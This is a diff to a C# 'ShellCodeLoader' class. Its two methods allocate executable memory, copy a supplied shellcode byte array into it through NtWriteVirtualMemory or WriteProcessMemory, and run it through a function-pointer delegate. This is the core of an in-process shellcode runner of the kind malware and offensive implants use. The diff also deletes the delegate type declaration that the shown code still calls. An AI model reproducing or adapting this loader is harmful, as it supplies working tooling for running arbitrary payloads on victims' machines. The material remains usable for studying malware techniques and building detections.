@@ -22,9 +22,6 @@ namespace ShellCodeLoader
         /// </summary>
         public bool Asynchronous { get; set; }
 
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        private delegate void ShellCodeCaller();
-
         public ShellCodeLoader(byte[] shellCode) 
         {
             this.ShellCode = shellCode;
@@ -89,25 +86,33 @@ namespace ShellCodeLoader
 
         private void NT() 
         {
-            Imports.NtAllocateVirtualMemory(Imports.GetCurrentProcess(), ref ptr, IntPtr.Zero, ref RegionSize, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, PageProtection.PAGE_EXECUTE_READWRITE);
+            Imports.NtAllocateVirtualMemory(Imports.GetCurrentProcess(), ref ptr, IntPtr.Zero, ref RegionSize, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, PageProtection.PAGE_EXECUTE_READWRITE);    
+            
             UIntPtr bytesWritten;
-            Imports.NtWriteVirtualMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out bytesWritten);
+            Imports.NtWriteVirtualMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out bytesWritten);        
+            
             PageProtection flOld = new PageProtection();
-            Imports.NtProtectVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, PageProtection.PAGE_EXECUTE_READ, ref flOld);
+            Imports.NtProtectVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, PageProtection.PAGE_EXECUTE_READ, ref flOld);     
+            
             ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
             load();
+                   
             Imports.NtFreeVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, FreeType.MEM_RELEASE);
         }
 
         private void Kernel32() 
         {
-            this.ptr = Imports.VirtualAlloc(IntPtr.Zero, (IntPtr)ShellCode.Length, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, PageProtection.PAGE_EXECUTE_READWRITE);
+            this.ptr = Imports.VirtualAlloc(IntPtr.Zero, (IntPtr)ShellCode.Length, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, PageProtection.PAGE_EXECUTE_READWRITE);         
+            
             UIntPtr writtenBytes;
-            Imports.WriteProcessMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out writtenBytes);
+            Imports.WriteProcessMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out writtenBytes);           
+            
             PageProtection flOld;
-            Imports.VirtualProtect(ptr, RegionSize, PageProtection.PAGE_EXECUTE_READ, out flOld);
+            Imports.VirtualProtect(ptr, RegionSize, PageProtection.PAGE_EXECUTE_READ, out flOld);         
+            
             ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
             load();
+            
             Imports.VirtualFree(ptr, (uint)0, FreeType.MEM_RELEASE);
         }
 
